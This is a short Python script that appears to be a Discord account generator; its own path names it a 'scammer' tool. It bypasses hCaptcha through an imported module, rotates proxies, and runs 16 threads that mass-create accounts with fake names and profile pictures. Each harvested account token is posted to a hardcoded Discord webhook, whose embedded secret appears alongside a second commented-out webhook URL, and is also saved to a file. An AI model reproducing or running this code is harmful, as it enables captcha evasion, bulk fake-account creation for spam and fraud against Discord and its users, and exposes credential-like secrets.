from hcapbypass import bypass
from generator import TokenGenerator
from discord_webhook import DiscordWebhook
import proxy_processor
import threading
import os
from os import walk

app_id = "912522407003164724"
app_webhook = "2b5f9061011d8eee761fedd4a173f1305ab18494e07cc2fe738d09fa824afef2"

verbose = True



def SendToken(token):
    webhook_url = "https://discord.com/api/webhooks/{}/{}".format(app_id, app_webhook)
    #webhook_url = 'https://discord.com/api/webhooks/886598290538385408/HI2sS-8fnPc-Venq3tlfzQOHVNa9ghksqhBf3MdbGQHIIcPo8J6Z1YJPJ10jN62u3-TA'
    webhook = DiscordWebhook(url=webhook_url, content=f'`{token}`')
    webhook.execute()
    with open('tokens.txt', 'a') as t:
        t.write(token + '\n')

def GenerateToken(names, pfps):
    while True:
        try:
            proxy = proxy_processor.GetProxy()
            print("[!] Used proxy: {}".format(proxy))
            gen = TokenGenerator(verbose, proxy, names, pfps)
            res = gen.GenerateToken()
            if 'token' in res:
                generatedToken = res["token"]
                print("[!] Generated Token: " + generatedToken)
                SendToken(generatedToken)
            else: print(res)
        except Exception as e:
            print(e)
            continue


def main():
    with open('ExoCord-Discord-Account-Generator-scammer-main/gen/data/names.txt', 'r') as t:
        names = [line.rstrip('\n') for line in t]

    pfps = next(walk('data/pfps/'), (None, None, []))[2]
    thread_list = []

    for i in range(16):
        thread = threading.Thread(target=GenerateToken, args=(names, pfps), daemon=True)
        thread.start()
        thread_list.append(thread)

    for thread in thread_list:
        thread.join()

if __name__ == '__main__':
	main()